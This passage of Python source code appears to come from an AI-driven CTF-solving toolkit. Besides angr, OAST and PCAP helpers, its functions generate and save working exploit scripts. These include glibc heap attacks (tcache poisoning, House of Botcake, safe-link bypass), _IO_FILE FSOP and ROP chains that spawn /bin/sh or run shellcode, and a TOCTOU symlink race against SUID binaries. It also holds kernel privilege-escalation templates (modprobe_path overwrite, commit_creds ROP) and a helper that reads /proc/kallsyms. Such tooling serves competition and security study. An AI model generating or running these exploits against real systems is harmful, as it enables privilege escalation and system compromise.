                    key=lambda s: s.solver.constraints.__len__(), reverse=True)
                sm.active = ranked[:max_active]
            return sm
        sm.explore(find=int("{find_addr}", 16), {avoid_clause} step_func=_prune)
    else:
        sm.explore(find=int("{find_addr}", 16), {avoid_clause})

    if sm.found:
        return sm.found[0].solver.eval(flag, cast_to=bytes)
    return None

print(f"[angr] addr-mode: find={'{find_addr}'} binary={binary!r}")

for vt, ma, label in [(True, 512, "veritesting"), (False, 64, "pruned"), (False, 512, "full")]:
    try:
        print(f"[angr] Strategy: {{label}}")
        sol = _solve(vt, ma)
        if sol:
            print("[FOUND]", sol)
            print("[STRING]", sol.decode("utf-8", errors="replace"))
            sys.exit(0)
        print(f"[angr] {{label}}: no path found")
    except Exception as e:
        print(f"[angr] {{label}} error: {{e}}")

print("[ERROR] No path found — try adjusting flag_length or switching to find_str mode")
print(f"  deadended/errored states logged above. flag_length={flag_length}")
'''
    return _sandboxed_exec(script, "angr_solve", session)

def _allocate_oast_payload() -> str:
    """Generate OAST payload URL using interactsh client."""
    from ctf_rag import oast
    try:
        res = oast.start_interactsh()
        if "error" in res: return res
        url, ts, pid = res.split("|")
        return f"[OAST] Payload allocated: {url}\n[!] Save this session_id for check_oast_logs: {ts}"
    except Exception as e:
        return f"[error] Failed to start interactsh: {e}"

def _check_oast_logs(session_id: str) -> str:
    """Check logs for OAST hits."""
    from ctf_rag import oast
    try:
        return oast.check_interactsh(session_id)
    except Exception as e:
        return f"[error] {e}"

def _pcap_analyze_flows(pcap_path: str, filter: str = None) -> str:
    """Parse a PCAP file and extract HTTP requests, DNS queries, and TCP streams."""
    import json
    import re
    
    p = Path(pcap_path)
    if not p.exists():
        return f"[error] PCAP file not found: {pcap_path}"
    
    bpf = filter or "tcp or udp or icmp"
    output_json = "/tmp/pcap_flows.json"
    
    cmd = f"tshark -r '{pcap_path}' -Y '{bpf}' -T fields -e frame.number -e ip.src -e ip.dst -e tcp.stream -e udp.stream -e dns.qry.name -e http.request.method -e http.request.uri -e http.request.full_uri -e http.response.code -e frame.len -e data 2>/dev/null | head -100"
    
    result = _shell_exec(cmd, timeout=30)
    if "[error]" in result:
        return "[error] tshark not available. Install wireshark-cli or use shell_exec with tcpdump/strings."
    
    lines = result.strip().split("\n") if result.strip() else []
    
    flows = {
        "http_requests": [],
        "dns_queries": [],
        "tcp_streams": [],
        "interesting_packets": []
    }
    
    flag_pattern = re.compile(r'[A-Za-z0-9_]+\{[^}]{3,60}\}')
    
    for line in lines:
        if not line.strip():
            continue
        parts = line.split("\t")
        if len(parts) < 10:
            continue
            
        frame_num, src_ip, dst_ip, tcp_stream, udp_stream, dns_qry, http_method, http_uri, http_full, http_code, frame_len = parts[:11]
        
        if frame_len and frame_len.isdigit():
            frame_len = int(frame_len)
            if frame_len > 1500:
                flows["interesting_packets"].append({
                    "frame": frame_num,
                    "src": src_ip,
                    "dst": dst_ip,
                    "size": frame_len
                })
        
        if dns_qry and dns_qry.strip():
            flows["dns_queries"].append({
                "query": dns_qry.strip(),
                "from": src_ip,
                "to": dst_ip
            })
        
        if http_method and http_method.strip():
            flows["http_requests"].append({
                "method": http_method.strip(),
                "uri": http_uri.strip() if http_uri else "",
                "full_url": http_full.strip() if http_full else "",
                "status": http_code.strip() if http_code else "",
                "src": src_ip,
                "dst": dst_ip
            })
        
        if tcp_stream and tcp_stream.strip():
            key = f"tcp_{tcp_stream}"
            if not any(s.get("stream") == key for s in flows["tcp_streams"]):
                flows["tcp_streams"].append({
                    "stream": key,
                    "src": src_ip,
                    "dst": dst_ip
                })
    
    for key in flows:
        if len(flows[key]) > 30:
            flows[key] = flows[key][:30]
    
    with open(output_json, "w") as f:
        json.dump(flows, f, indent=2)
    
    summary = []
    summary.append(f"[PCAP Analysis] Analyzed {len(lines)} packets from {pcap_path}")
    summary.append(f"  HTTP requests: {len(flows['http_requests'])}")
    summary.append(f"  DNS queries: {len(flows['dns_queries'])}")
    summary.append(f"  TCP streams: {len(flows['tcp_streams'])}")
    summary.append(f"  Large packets: {len(flows['interesting_packets'])}")
    
    if flows["http_requests"]:
        summary.append("\n[HTTP Requests]:")
        for req in flows["http_requests"][:5]:
            summary.append(f"  {req['method']} {req['uri'] or req['full_url']}")
    
    if flows["dns_queries"]:
        summary.append("\n[DNS Queries]:")
        for q in flows["dns_queries"][:5]:
            summary.append(f"  {q['query']}")
    
    if flows["tcp_streams"]:
        summary.append("\n[TCP Streams]:")
        for s in flows["tcp_streams"][:5]:
            summary.append(f"  {s['src']} -> {s['dst']}")
    
    return "\n".join(summary) + f"\n\n[Full JSON saved to: {output_json}]"


# ---------------------------------------------------------------------------
# Advanced exploit tools — heap, ROP synthesis, IO_FILE, race, kernel
# ---------------------------------------------------------------------------

def _heap_exploit(binary: str, technique: str, target_addr: str = "",
                  libc_path: str = "", glibc_version: str = "", session=None) -> str:
    """Generate and optionally test a heap exploitation script."""

    # Auto-detect glibc version if not provided
    if not glibc_version:
        ver_out = _shell_exec("ldd --version 2>&1 | head -1")
        import re
        m = re.search(r'(\d+\.\d+)', ver_out)
        glibc_version = m.group(1) if m else "2.35"

    scripts = {
        "tcache_poison": f'''\
#!/usr/bin/env python3
"""
Tcache poisoning — glibc 2.27-2.31 (no PROTECT_PTR)
Goal: overwrite target={target_addr!r}
"""
from pwn import *
context.binary = elf = ELF({binary!r})
libc = ELF({libc_path!r}) if {bool(libc_path)!r} else None

# io = process(elf.path)
# io = remote('host', port)
io = process(elf.path)

def alloc(size, data=b""):
    # TODO: replace with your alloc primitive
    pass

def free(idx):
    # TODO: replace with your free primitive
    pass

def read_ptr(idx):
    # TODO: replace with your read primitive
    return 0

# 1. Fill tcache[sz] (7 frees)
# 2. Free chunk into unsorted bin for libc leak
# 3. Drain tcache; leak libc from unsorted bin fd/bk

# Tcache poisoning (no key)
# free(A); free(B); write target_addr into B.fd
# malloc×2 → second returns target_addr
target = {repr(int(target_addr, 16)) if target_addr else 0}
# free(chunk_b)
# write_to_chunk_b(target)  # overwrite fd
# alloc(sz) → returns chunk_b
# alloc(sz) → returns target (arbitrary write location)

io.interactive()
''',

        "botcake": f'''\
#!/usr/bin/env python3
"""
House of Botcake — double-free bypass (glibc 2.29+)
Consolidates chunk into unsorted bin, then double-frees into tcache.
"""
from pwn import *
context.binary = elf = ELF({binary!r})
io = process(elf.path)

# Botcake setup: sizes must be same for consolidation
CHUNK_SIZE = 0x100  # adjust to challenge

def alloc(size, data=b"A"):
    pass  # your alloc primitive

def free(idx):
    pass  # your free primitive

# Step 1: fill tcache[CHUNK_SIZE] with 7 chunks
prev = [alloc(CHUNK_SIZE) for _ in range(7)]
A = alloc(CHUNK_SIZE)   # chunk to double-free
_ = alloc(0x10)         # guard chunk (prevent consolidation with top)

# Step 2: drain tcache → A goes to unsorted bin
for i in range(7): free(prev[i])
free(A)  # A → unsorted bin

# Step 3: refill tcache, then free A again into tcache
_ = alloc(CHUNK_SIZE)   # one alloc to make room
free(A)  # A → tcache (double-free bypassed via unsorted bin detour)

# Step 4: tcache is now: A → (A+unsorted_overlap)
# Modify fd of A in tcache to point to target
target = {repr(int(target_addr, 16)) if target_addr else 0}
# write_fd(A, target ^ (A_addr >> 12))  # safe-link encode if glibc >= 2.32

io.interactive()
''',

        "tangerine": f'''\
#!/usr/bin/env python3
"""
House of Tangerine — tcache_perthread_struct corruption (glibc 2.35+)
Abuses tcache counts[] and entries[] arrays in the perthread struct.
"""
from pwn import *
context.binary = elf = ELF({binary!r})
io = process(elf.path)

# tcache_perthread_struct layout (x86_64):
# [0x00] counts[64]  — 1 byte each, how many in each bin
# [0x40] entries[64] — 8 bytes each, head of each tcache bin
# Total struct size: 0x290

# To corrupt entries[idx]:
#   - overwrite tcache_perthread_struct + 0x40 + idx*8
#   - set counts[idx] to nonzero (so malloc believes bin is populated)
# Then malloc(size_for_idx) returns entries[idx] — arbitrary alloc

target = {repr(int(target_addr, 16)) if target_addr else 0}
# Requires write primitive to heap where tcache_perthread_struct lives
# tcache_perthread_struct is always at heap_base + 0x10

io.interactive()
''',

        "safe_link_bypass": f'''\
#!/usr/bin/env python3
"""
Safe-link (PROTECT_PTR) bypass — glibc 2.32+
fd_stored = fd_real ^ (slot_addr >> 12)
"""
from pwn import *
context.binary = elf = ELF({binary!r})
io = process(elf.path)

def mangle(heap_ptr, addr):
    """Encode a tcache fd pointer (PROTECT_PTR)."""
    return addr ^ (heap_ptr >> 12)

def demangle(encoded, pos):
    """Decode a stored tcache fd pointer."""
    return encoded ^ (pos >> 12)

# Leak heap base:
# alloc a chunk → free it → read fd field → fd ^ (chunk_addr >> 12)
# If fd==0 (was head of tcache), then: 0 ^ (chunk_addr >> 12)
# → chunk_addr >> 12 is stored directly → shift left 12 for heap base

# heap_leak = read_freed_fd()  # from UAF read
# chunk_addr = heap_leak << 12  # approximate heap addr
# heap_base  = chunk_addr & ~0xfff

target = {repr(int(target_addr, 16)) if target_addr else 0}
# encoded_target = mangle(chunk_addr, target)
# write fd = encoded_target  # safe-link encoded

io.interactive()
''',

        "io_file_fsop": _get_io_file_template(binary, "fsop_str_overflow", libc_path),
    }

    code = scripts.get(technique)
    if not code:
        return f"[heap_exploit] Unknown technique '{technique}'. Available: {list(scripts.keys())}"

    out_path = f"/tmp/heap_{technique}.py"
    _write_file(out_path, code)
    return (
        f"[heap_exploit] Generated {technique} skeleton → {out_path}\n"
        f"Glibc version detected: {glibc_version}\n\n"
        f"```python\n{code[:3000]}\n```\n"
        f"\nUse: write_file('/path/to/exploit.py', <modified_code>) then shell_exec('python3 /path/to/exploit.py')"
    )


def _get_io_file_template(binary: str, technique: str, libc_path: str = "") -> str:
    """Inner template builder for IO_FILE exploits."""
    return f'''\
#!/usr/bin/env python3
"""
_IO_FILE FSOP — _IO_str_overflow vtable pivot (glibc 2.34+, no hooks)
Triggers: exit() / return from main / fclose() / fflush(NULL)
"""
from pwn import *
context.binary = elf = ELF({binary!r})
libc = ELF({libc_path!r}) if {bool(libc_path)!r} else ELF("/lib/x86_64-linux-gnu/libc.so.6")
io = process(elf.path)

# ─── After getting a heap write primitive and libc base ───

def fake_file_fsop(libc_base, target_call=None):
    """
    Build a fake _IO_FILE for _IO_str_overflow FSOP.
    When _IO_str_overflow sees write_ptr > buf_end, it calls:
        malloc(new_size)  ← intercepted via vtable overwrite
    We replace vtable with _IO_str_jumps - offset to make __overflow
    actually call system(fake_file) instead.
    """
    _IO_str_jumps = libc_base + libc.sym.get("_IO_str_jumps", 0)
    system_addr   = libc_base + libc.sym["system"]

    # _IO_str_overflow is called when:
    #   _IO_write_ptr >= _IO_buf_end AND _IO_buf_base != 0
    # It then calls: (*fp->_s._allocate_buffer)(new_size)
    # We plant system("/bin/sh") as the allocate_buffer fn ptr

    binsh = libc_base + next(libc.search(b"/bin/sh\\x00"))

    fake = FileStructure()
    fake.flags        = 0x3b01010101010101  # bypass sanity checks
    fake._IO_buf_base = 0                    # read_base
    fake._IO_buf_end  = (binsh >> 8) - 100  # triggers overflow when write_ptr passes it
    fake._IO_write_base = 0
    fake._IO_write_ptr  = (binsh >> 8)       # write_ptr > buf_end
    fake._IO_write_end  = system_addr        # _allocate_buffer fn ptr at correct offset

    # Overwrite vtable to _IO_str_jumps (bypass vtable validation: within valid range)
    fake.vtable = _IO_str_jumps - 0x20

    return bytes(fake)

# fake = fake_file_fsop(libc_base)
# Write fake to a writable heap/bss location
# Overwrite _IO_list_all to point to fake FILE struct
# Call exit() or return from main to trigger FSOP

io.interactive()
'''


def _io_file_exploit(binary: str, technique: str, libc_path: str = "",
                     heap_addr: str = "", libc_base: str = "", session=None) -> str:
    """Generate an _IO_FILE exploitation script."""
    code = _get_io_file_template(binary, technique, libc_path)
    out_path = f"/tmp/iofile_{technique}.py"
    _write_file(out_path, code)

    extra_notes = {
        "fsop_str_overflow": (
            "Technique: _IO_str_overflow vtable pivot\n"
            "Trigger: exit() or return from main walks _IO_list_all\n"
            "Requires: libc base leak + write primitive to overwrite _IO_list_all"
        ),
        "house_of_apple2": (
            "Technique: _IO_wfile_overflow wide vtable call\n"
            "Chain: _IO_wfile_overflow → _IO_wdoallocbuf → wide_vtable.__doallocate\n"
            "Control: set fp->_wide_data and fp->_wide_data->_IO_write_base"
        ),
        "house_of_emma": (
            "Technique: _IO_cookie_file with custom function pointers\n"
            "Cookie fns: read/write/seek/close → arbitrary call on fclose\n"
            "Control: set __io_read = system; cookie = &/bin/sh"
        ),
        "vtable_hijack": (
            "Direct vtable overwrite (only works if vtable in writable range)\n"
            "glibc 2.24+: vtable pointer validated — must use vtable within libc range\n"
            "Bypass: use _IO_str_jumps or _IO_wfile_jumps (both in valid range)"
        ),
    }

    note = extra_notes.get(technique, "See generated script for details.")
    return (
        f"[io_file_exploit] Generated {technique} → {out_path}\n\n"
        f"{note}\n\n"
        f"```python\n{code[:3000]}\n```"
    )


def _rop_chain_synthesis(binary: str, goal: str, offset: int,
                          libc_path: str = "", leak_addr: str = "",
                          leak_symbol: str = "puts", flag_path: str = "/flag",
                          session=None) -> str:
    """
    Synthesise a ROP chain skeleton using ROPgadget output.
    Auto-parses found gadget addresses and fills them into the template.
    """
    import re as _re

    # Run ROPgadget to find key gadgets
    gadget_search = _shell_exec(
        f"ROPgadget --binary '{binary}' --rop --nosys 2>/dev/null | "
        f"grep -E 'pop rdi|pop rsi|pop rdx|ret$|syscall|pop rax|pop rbx' | head -40",
        timeout=60,
    )

    # Also try ropper as fallback
    if not gadget_search.strip() or "[error]" in gadget_search.lower():
        gadget_search = _shell_exec(
            f"ropper -f '{binary}' --nocolor 2>/dev/null | "
            f"grep -E 'pop rdi|pop rsi|pop rdx|syscall|pop rax' | head -20",
            timeout=30,
        )

    # ── Auto-parse gadget addresses ──────────────────────────────────────────
    def _find_gadget_addr(pattern: str) -> str:
        """Return hex address of first gadget matching pattern, or '0x0' if not found."""
        for line in gadget_search.splitlines():
            line_lower = line.lower()
            if _re.search(pattern, line_lower):
                m = _re.match(r'\s*(0x[0-9a-f]+)', line)
                if m:
                    return m.group(1)
        return "0x0"

    ret_gadget  = _find_gadget_addr(r':\s*ret\s*$')
    pop_rdi     = _find_gadget_addr(r'pop rdi\s*;?\s*ret')
    pop_rsi     = _find_gadget_addr(r'pop rsi\s*;[^;]*ret')
    pop_rdx     = _find_gadget_addr(r'pop rdx\s*;[^;]*ret')
    pop_rax     = _find_gadget_addr(r'pop rax\s*;[^;]*ret')
    syscall_gad = _find_gadget_addr(r'syscall\s*;?\s*ret')

    auto_note = (
        f"# ── Auto-detected gadget addresses ─────────────────\n"
        f"# ret      : {ret_gadget}\n"
        f"# pop rdi  : {pop_rdi}\n"
        f"# pop rsi  : {pop_rsi}\n"
        f"# pop rdx  : {pop_rdx}\n"
        f"# pop rax  : {pop_rax}\n"
        f"# syscall  : {syscall_gad}\n"
        f"# {'NOTE: some addresses are 0x0 — not found in binary. Use find_gadget() or search libc.' if '0x0' in (pop_rdi, pop_rsi, pop_rdx) else 'All key gadgets found!'}\n"
    )

    # Parse libc base if leak provided
    libc_base_calc = ""
    if leak_addr and libc_path:
        libc_base_calc = f"""
# Libc base calculation from leaked {leak_symbol}
# leaked = {leak_addr}
leaked = {leak_addr}
libc.address = leaked - libc.sym['{leak_symbol}']
log.info(f"libc base: {{libc.address:#x}}")
"""

    templates = {
        "execve_binsh": f'''\
#!/usr/bin/env python3
"""ROP chain: execve('/bin/sh', NULL, NULL) / system('/bin/sh')"""
from pwn import *
context.binary = elf = ELF({binary!r})
{'libc = ELF(' + repr(libc_path) + ')' if libc_path else 'libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")'}
io = process(elf.path)  # or remote(HOST, PORT)

{auto_note}
ret_gadget  = {ret_gadget}   # bare ret  (stack alignment — MOVAPS fix)
pop_rdi     = {pop_rdi}      # pop rdi; ret
pop_rsi     = {pop_rsi}      # pop rsi; (pop r15;) ret
pop_rdx     = {pop_rdx}      # pop rdx; ret  (may need ret2csu if 0x0)

{libc_base_calc}

# ── ROP Chain ─────────────────────────────────────────────────────
padding = {offset} * b"A"

# Option A: one_gadget (run: one_gadget {libc_path or "auto"})
# one_gadget_addr = libc.address + 0x0  # from one_gadget output

# Option B: system('/bin/sh')
binsh  = next(elf.search(b"/bin/sh\\x00"), 0)
if not binsh and hasattr(libc, 'address') and libc.address:
    binsh = next(libc.search(b"/bin/sh\\x00"), 0)
system = elf.sym.get("system") or (libc.address + libc.sym["system"])

rop = ROP(elf)
rop.raw(ret_gadget)           # stack alignment (MOVAPS fix)
rop.raw(pop_rdi)
rop.raw(binsh)
rop.raw(system)

payload = padding + rop.chain()
io.sendlineafter(b"> ", payload)
io.interactive()
''',

        "orw_flag": f'''\
#!/usr/bin/env python3
"""ROP chain: open+read+write (for seccomp-restricted binaries)"""
from pwn import *
context.binary = elf = ELF({binary!r})
{'libc = ELF(' + repr(libc_path) + ')' if libc_path else 'libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")'}
io = process(elf.path)

{auto_note}
pop_rdi    = {pop_rdi}
pop_rsi    = {pop_rsi}
pop_rdx    = {pop_rdx}
ret_gadget = {ret_gadget}
syscall_g  = {syscall_gad}  # raw syscall gadget (fallback if libc funcs unavailable)

{libc_base_calc}

flag_path = {flag_path!r}
writable  = elf.bss(0x200)  # place flag string in BSS

padding = {offset} * b"A"

# 1. Write flag path to writable memory
rop = ROP([elf, libc])
rop.raw(pop_rdi); rop.raw(writable)
# ... (use read() or gets() to plant flag path)

# 2. open(flag_path, 0, 0) → fd=3 (usually)
rop.raw(pop_rdi); rop.raw(writable)
rop.raw(pop_rsi); rop.raw(0)
rop.call(libc.sym["open"])

# 3. read(fd=3, buf=writable+0x100, count=0x50)
rop.raw(pop_rdi); rop.raw(3)
rop.raw(pop_rsi); rop.raw(writable + 0x100)
rop.raw(pop_rdx); rop.raw(0x50)
rop.call(libc.sym["read"])

# 4. write(fd=1, buf=writable+0x100, count=0x50)
rop.raw(pop_rdi); rop.raw(1)
rop.raw(pop_rsi); rop.raw(writable + 0x100)
rop.raw(pop_rdx); rop.raw(0x50)
rop.call(libc.sym["write"])

payload = padding + rop.chain()
io.sendlineafter(b"> ", payload)
io.interactive()
''',

        "leak_got": f'''\
#!/usr/bin/env python3
"""ROP chain: leak puts@GOT via puts@PLT to defeat ASLR"""
from pwn import *
context.binary = elf = ELF({binary!r})
{'libc = ELF(' + repr(libc_path) + ')' if libc_path else 'libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")'}
io = process(elf.path)

{auto_note}
pop_rdi    = {pop_rdi}   # pop rdi; ret
ret_gadget = {ret_gadget}  # bare ret (stack alignment)

padding = {offset} * b"A"

# Stage 1: leak puts@GOT
rop1 = ROP(elf)
rop1.raw(ret_gadget)
rop1.raw(pop_rdi)
rop1.raw(elf.got["puts"])
rop1.raw(elf.plt["puts"])
rop1.raw(elf.sym["main"])  # loop back to main for stage 2

io.sendlineafter(b"> ", padding + rop1.chain())

# Parse leak
puts_leak = u64(io.recvuntil(b"\\n", drop=True).ljust(8, b"\\x00"))
log.info(f"puts @ {{puts_leak:#x}}")
libc.address = puts_leak - libc.sym["puts"]
log.info(f"libc base @ {{libc.address:#x}}")

# Stage 2: execve('/bin/sh')
binsh  = next(libc.search(b"/bin/sh\\x00"))
system = libc.sym["system"]

rop2 = ROP([elf, libc])
rop2.raw(ret_gadget)
rop2.raw(pop_rdi)
rop2.raw(binsh)
rop2.raw(system)

io.sendlineafter(b"> ", padding + rop2.chain())
io.interactive()
''',

        "mprotect_shellcode": f'''\
#!/usr/bin/env python3
"""ROP chain: mprotect → rwx → shellcode"""
from pwn import *
context.binary = elf = ELF({binary!r})
{'libc = ELF(' + repr(libc_path) + ')' if libc_path else 'libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")'}
io = process(elf.path)

{auto_note}
pop_rdi    = {pop_rdi}
pop_rsi    = {pop_rsi}
pop_rdx    = {pop_rdx}
ret_gadget = {ret_gadget}

{libc_base_calc}

shellcode = asm(shellcraft.sh())
padding   = {offset} * b"A"

# Target address for shellcode (writable+executable after mprotect)
shellcode_addr = elf.bss() & ~0xfff  # page-align BSS

rop = ROP([elf, libc])
# mprotect(shellcode_addr, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC)
rop.raw(pop_rdi); rop.raw(shellcode_addr)
rop.raw(pop_rsi); rop.raw(0x1000)
rop.raw(pop_rdx); rop.raw(7)
rop.call(libc.sym["mprotect"])
rop.raw(shellcode_addr + 0x100)  # jump to shellcode

payload = padding + rop.chain() + b"\\x90" * (0x100 - len(rop.chain())) + shellcode
io.sendlineafter(b"> ", payload)
io.interactive()
''',
    }

    code = templates.get(goal)
    if not code:
        return f"[rop_chain_synthesis] Unknown goal '{goal}'. Available: {list(templates)}"

    out_path = f"/tmp/rop_{goal}.py"
    _write_file(out_path, code)

    filled = sum(1 for x in (ret_gadget, pop_rdi, pop_rsi, pop_rdx) if x != "0x0")
    return (
        f"[rop_chain_synthesis] Synthesised {goal} ROP chain → {out_path}\n"
        f"Auto-filled {filled}/4 gadget addresses (ret, pop_rdi, pop_rsi, pop_rdx).\n"
        f"{'All key gadgets auto-detected!' if filled == 4 else 'Some gadgets are 0x0 — find them with find_gadget() or search libc.'}\n\n"
        f"Gadgets found in binary:\n{gadget_search[:800]}\n\n"
        f"Script saved — run immediately:\n"
        f"  shell_exec('python3 {out_path}')\n\n"
        f"If gadgets are missing from the binary, search libc:\n"
        f"  find_gadget('{libc_path or '/lib/x86_64-linux-gnu/libc.so.6'}', 'pop rdx; ret')"
    )


def _race_condition_exploit(mode: str, target: str,
                             race_window: int = 20, check_path: str = "",
                             target_path: str = "") -> str:
    """Generate race condition exploit scripts."""

    if mode == "toctou_symlink":
        code = f'''\
#!/bin/bash
# TOCTOU symlink race: swap {check_path!r} → {target_path!r} during check-use window
# Run this alongside the target to win the race

TARGET_CHECK={check_path!r}
TARGET_WRITE={target_path!r}
RACE_COUNT={race_window}

# Create a benign file initially
echo "safe content" > "$TARGET_CHECK"

for i in $(seq 1 $RACE_COUNT); do
    # Race thread: rapidly swap between safe file and target symlink
    (
        while true; do
            ln -sf /tmp/safe_file "$TARGET_CHECK" 2>/dev/null
            ln -sf "$TARGET_WRITE" "$TARGET_CHECK" 2>/dev/null
        done
    ) &
    RACE_PID=$!

    # Trigger the vulnerable SUID binary
    {target} &

    sleep 0.5
    kill $RACE_PID 2>/dev/null
    wait $RACE_PID 2>/dev/null

    # Check if race was won
    if [ -r "$TARGET_WRITE" ]; then
        echo "[+] Race won! Content:"
        cat "$TARGET_WRITE"
        break
    fi
done
'''
        out = "/tmp/race_toctou.sh"
        _write_file(out, code)
        _shell_exec(f"chmod +x {out}")
        return f"[race_condition] TOCTOU script → {out}\n```bash\n{code}\n```"

    elif mode == "parallel_requests":
        code = f'''\
#!/usr/bin/env python3
"""Parallel HTTP requests to win race condition window."""
import threading, requests, time

TARGET_URL = {target!r}
N_THREADS  = {race_window}
RESULTS    = []

def send_request(idx):
    try:
        r = requests.post(TARGET_URL, data={{"action": "transfer", "amount": "100"}},
                          timeout=5)
        RESULTS.append((idx, r.status_code, r.text[:200]))
    except Exception as e:
        RESULTS.append((idx, -1, str(e)))

# Fire all requests simultaneously
threads = [threading.Thread(target=send_request, args=(i,)) for i in range(N_THREADS)]
start = time.time()
for t in threads: t.start()
for t in threads: t.join()
elapsed = time.time() - start

print(f"[+] Sent {{N_THREADS}} requests in {{elapsed:.3f}}s")
for idx, code, body in sorted(RESULTS):
    print(f"  Thread {{idx:2d}}: HTTP {{code}} — {{body[:80]}}")
'''
        out = "/tmp/race_parallel.py"
        _write_file(out, code)
        return f"[race_condition] Parallel requests script → {out}\n```python\n{code}\n```"

    elif mode == "userfaultfd_pause":
        code = f'''\
#!/usr/bin/env python3
"""
userfaultfd race — pause kernel mid-copy for precise timing window.
Requires: /proc/sys/vm/unprivileged_userfaultfd = 1  (or CAP_SYS_PTRACE)
"""
import ctypes, os, struct, threading

UFFDIO_API    = 0xc018aa3f
UFFDIO_REGISTER = 0xc020aa00
UFFDIO_COPY   = 0xc028aa03
PAGEFAULT_FLAG_WP = 4
UFFD_EVENT_PAGEFAULT = 0x12

# Open userfaultfd
uffd = ctypes.CDLL(None).syscall(323)  # __NR_userfaultfd
if uffd < 0:
    print("[-] userfaultfd not available (need CAP_SYS_PTRACE or kernel param)")
    exit(1)

# TODO: map a page with mmap, register with UFFDIO_REGISTER
# When the kernel touches this page (during copy_from_user), it will
# fault and block — giving us a precise timing window to swap data.
print("[+] userfaultfd opened:", uffd)
print("[!] Implement: mmap + register + fault handler thread")
print("[!] Place fault page at the boundary of the race window")
'''
        out = "/tmp/race_userfaultfd.py"
        _write_file(out, code)
        return f"[race_condition] userfaultfd script → {out}\n```python\n{code}\n```"

    elif mode == "fork_timing":
        code = f'''\
#!/usr/bin/env python3
"""
Fork timing attack: measure exec time variance to predict ASLR/PIE base.
Works on 32-bit binaries where ASLR entropy is low (2^8 = 256 bases).
"""
import subprocess, time, struct

binary = {target!r}
N_SAMPLES = 256

times = []
for i in range(N_SAMPLES):
    t0 = time.perf_counter_ns()
    r = subprocess.run([binary], input=b"A"*100, capture_output=True, timeout=2)
    t1 = time.perf_counter_ns()
    times.append((t1 - t0, i, r.returncode))

times.sort()
print("Fastest executions (likely same base):")
for elapsed, idx, rc in times[:10]:
    print(f"  run {{idx:3d}}: {{elapsed/1e6:.2f}}ms  rc={{rc}}")

# Cluster by timing to infer when same base was hit
# (Same base = same cache lines = faster execution)
'''
        out = "/tmp/race_fork_timing.py"
        _write_file(out, code)
        return f"[race_condition] Fork timing script → {out}\n```python\n{code}\n```"

    return f"[race_condition] Unknown mode: {mode}"


def _kernel_exploit(action: str, technique: str = "", binary: str = "",
                    kallsyms_path: str = "/proc/kallsyms") -> str:
    """Kernel exploitation toolkit."""

    if action == "info":
        # Gather kernel security info
        info = _shell_exec(
            "uname -a && "
            "cat /proc/sys/kernel/randomize_va_space 2>/dev/null && "
            "cat /proc/kallsyms 2>/dev/null | grep ' T startup_64' | head -3 && "
            "dmesg 2>/dev/null | grep -i 'smep\\|smap\\|kpti\\|pti\\|kaiser' | head -5 && "
            "cat /sys/devices/system/cpu/vulnerabilities/meltdown 2>/dev/null && "
            "cat /proc/cpuinfo | grep -m1 'model name'",
            timeout=15
        )
        return f"[kernel_exploit info]\n{info}"

    elif action == "seccomp_check":
        if not binary:
            return "[kernel_exploit] 'binary' required for seccomp_check"
        result = _shell_exec(
            f"seccomp-tools dump {binary!r} 2>/dev/null || "
            f"python3 -c \"import pwnlib.util.misc; "
            f"print(pwnlib.util.misc.read('/proc/$(pidof $(basename {binary!r}))/status'))\" "
            f"2>/dev/null || echo 'seccomp-tools not available: pip install seccomp-tools'",
            timeout=30
        )
        return f"[seccomp profile for {binary}]\n{result}"

    elif action == "find_gadgets":
        result = _shell_exec(
            f"cat {kallsyms_path} 2>/dev/null | grep -E "
            f"'commit_creds|prepare_kernel_cred|modprobe_path|"
            f"swapgs_restore_regs_and_return_to_usermode|"
            f"startup_64|_text\\b' | head -20",
            timeout=15
        )
        if not result.strip() or "Permission denied" in result:
            return (
                "[kernel_exploit] /proc/kallsyms not readable (KASLR active or unprivileged).\n"
                "Try: dmesg | grep -i 'kernel\\|text' for address hints,\n"
                "or check if any info-leak bug exists in the module."
            )
        return f"[kernel symbols]\n{result}"

    elif action == "gen_exploit":
        templates = {
            "modprobe_path": '''\
#!/usr/bin/env python3
"""
Kernel exploit: modprobe_path overwrite
Root via: write our script path to modprobe_path, trigger with unknown-format binary.
"""
import os, ctypes, struct

# --- From kernel leak ---
# modprobe_path address (from /proc/kallsyms or module info-leak)
MODPROBE_PATH_ADDR = 0xffffffff81e38180  # FILL THIS IN

# Our helper script (will run as root)
HELPER = "/tmp/pwn_helper.sh"
with open(HELPER, "w") as f:
    f.write("#!/bin/sh\\nchmod 777 /flag\\ncp /flag /tmp/flag_copy\\nchmod 777 /tmp/flag_copy\\n")
os.chmod(HELPER, 0o777)

# Trigger file (unknown format → kernel runs modprobe to identify it)
TRIGGER = "/tmp/unknown_fmt"
with open(TRIGGER, "wb") as f:
    f.write(b"\\xff\\xff\\xff\\xff")  # invalid magic
os.chmod(TRIGGER, 0o777)

# Write helper path to modprobe_path via kernel write primitive
# TODO: replace with your write primitive
def kernel_write(addr, data):
    """Your arbitrary kernel write primitive goes here."""
    raise NotImplementedError("Implement kernel write primitive")

kernel_write(MODPROBE_PATH_ADDR, HELPER.encode() + b"\\x00")

# Trigger
os.system(TRIGGER)
import time; time.sleep(0.5)

# Read flag
os.system("cat /tmp/flag_copy 2>/dev/null || cat /flag 2>/dev/null")
''',

            "commit_creds_rop": '''\
#!/usr/bin/env python3
"""
Kernel ROP: commit_creds(prepare_kernel_cred(0)) + KPTI trampoline
"""
import os, ctypes, struct

# --- Fill from /proc/kallsyms or leak ---
KERNEL_BASE                       = 0xffffffff81000000  # startup_64 addr
COMMIT_CREDS_OFFSET               = 0x0  # commit_creds - kernel_base
PREPARE_KERNEL_CRED_OFFSET        = 0x0  # prepare_kernel_cred - kernel_base
KPTI_TRAMPOLINE_OFFSET            = 0x0  # swapgs_restore_regs_and_return_to_usermode+22

commit_creds          = KERNEL_BASE + COMMIT_CREDS_OFFSET
prepare_kernel_cred   = KERNEL_BASE + PREPARE_KERNEL_CRED_OFFSET
kpti_trampoline       = KERNEL_BASE + KPTI_TRAMPOLINE_OFFSET

# --- ROP gadgets (from kernel .text) ---
# pop_rdi_ret, pop_rcx_ret, etc. — find with ROPgadget on vmlinux

# --- User-space restore values (save BEFORE exploit) ---
import ctypes
libc = ctypes.CDLL("libc.so.6", use_errno=True)

user_cs = user_ss = user_rsp = user_rflags = 0
def save_state():
